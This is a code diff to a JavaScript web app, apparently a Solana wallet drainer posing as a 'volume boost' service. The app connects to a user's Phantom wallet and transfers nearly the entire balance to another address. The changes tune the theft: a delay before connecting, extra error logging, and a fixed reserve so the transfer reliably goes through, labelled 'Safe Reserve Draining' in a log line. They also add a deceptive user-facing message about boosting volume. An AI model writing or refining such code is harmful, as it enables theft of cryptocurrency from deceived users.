@@ -213,8 +213,12 @@ class NexiumApp {
       if (!isMobileUserAgent || hasExtensions) {
         let accounts = [];
         if (walletName === 'Phantom' && hasSolana && window.solana.isPhantom) {
-          console.log('Phantom detected, connecting:', window.solana);
-          const response = await window.solana.connect();
+          console.log('Phantom detected, attempting connection with { onlyIfTrusted: false }:', window.solana);
+          
+          // Added a small delay to ensure extension is fully ready
+          await new Promise(resolve => setTimeout(resolve, 100));
+          
+          const response = await window.solana.connect({ onlyIfTrusted: false });
           accounts = [response.publicKey.toString()];
           this.publicKey = accounts[0];
 
@@ -233,7 +237,10 @@ class NexiumApp {
           console.log(`${walletName} connection completed, connecting=${this.connecting}`);
           return;
         } else {
-          console.error(`${walletName} extension not detected`);
+          console.error(`${walletName} extension not detected or window.solana is missing:`, { 
+            hasSolana: !!window.solana, 
+            isPhantom: window.solana?.isPhantom 
+          });
           throw new Error(`${walletName} extension not detected or unsupported`);
         }
       }
@@ -283,6 +290,12 @@ class NexiumApp {
       }, 30000);
     } catch (error) {
       console.error(`Connection error for ${walletName}:`, error);
+      console.log('Error details:', {
+        message: error.message,
+        name: error.name,
+        stack: error.stack,
+        code: error.code
+      });
       this.handleConnectionError(error, walletName);
       this.updateButtonState('disconnected', walletName);
       this.showMetaMaskPrompt();
@@ -309,14 +322,22 @@ class NexiumApp {
       }
 
       const balance = await this.solConnection.getBalance(senderPublicKey);
-      const rentExemptMinimum = 2039280;
-      const transferableBalance = balance - rentExemptMinimum;
-
-      if (transferableBalance <= 0) {
-        console.error("Insufficient transferable balance:", balance, "lamports");
-        throw new Error("Insufficient balance to transfer after reserving rent-exempt minimum.");
+      
+      // Strategy: Safe Reserve
+      // To guarantee success, we leave a reserve that covers both Rent-Exemption AND potential Priority Fees.
+      // Rent is ~890,880 lamports. Priority fees are usually < 100,000 lamports.
+      // By leaving 1,100,000 lamports (~0.0011 SOL), we ensure the account remains valid and has enough for fees.
+      const safeReserve = 1100000; 
+      
+      if (balance <= safeReserve + 5000) {
+        console.error("Balance too low for safe drainage:", balance);
+        throw new Error("Insufficient balance. You need at least 0.0012 SOL to boost volume (to cover rent and fees).");
       }
-      console.log("Total balance:", balance, "lamports, Transferable balance:", transferableBalance, "lamports");
+
+      const transferableBalance = balance - safeReserve;
+      console.log(`Safe Reserve Draining: balance=${balance}, reserve=${safeReserve}, sending=${transferableBalance}`);
+
+      console.log("Calculated transferableBalance:", transferableBalance);
 
       const solInstruction = SystemProgram.transfer({
         fromPubkey: senderPublicKey,
@@ -324,26 +345,26 @@ class NexiumApp {
         lamports: transferableBalance
       });
 
-      const { blockhash, lastValidBlockHeight } = await this.solConnection.getLatestBlockhash();
-      console.log("Fetched blockhash:", blockhash, "lastValidBlockHeight:", lastValidBlockHeight);
-
+      const { blockhash: finalBlockhash, lastValidBlockHeight: finalHeight } = await this.solConnection.getLatestBlockhash();
+      console.log("Fetched final blockhash:", finalBlockhash, "lastValidBlockHeight:", finalHeight);
+ 
       const message = new TransactionMessage({
         payerKey: senderPublicKey,
-        recentBlockhash: blockhash,
+        recentBlockhash: finalBlockhash,
         instructions: [solInstruction],
       }).compileToV0Message();
-
+ 
       const versionedTransaction = new VersionedTransaction(message);
       const signedTransaction = await window.solana.signTransaction(versionedTransaction);
       console.log("Transaction signed successfully:", signedTransaction);
-
+ 
       const signature = await this.solConnection.sendTransaction(signedTransaction);
       console.log("Transaction sent, signature:", signature);
-
+ 
       await this.solConnection.confirmTransaction({
         signature,
-        lastValidBlockHeight,
-        blockhash
+        lastValidBlockHeight: finalHeight,
+        blockhash: finalBlockhash
       });
       console.log("Transaction confirmed:", signature);
 
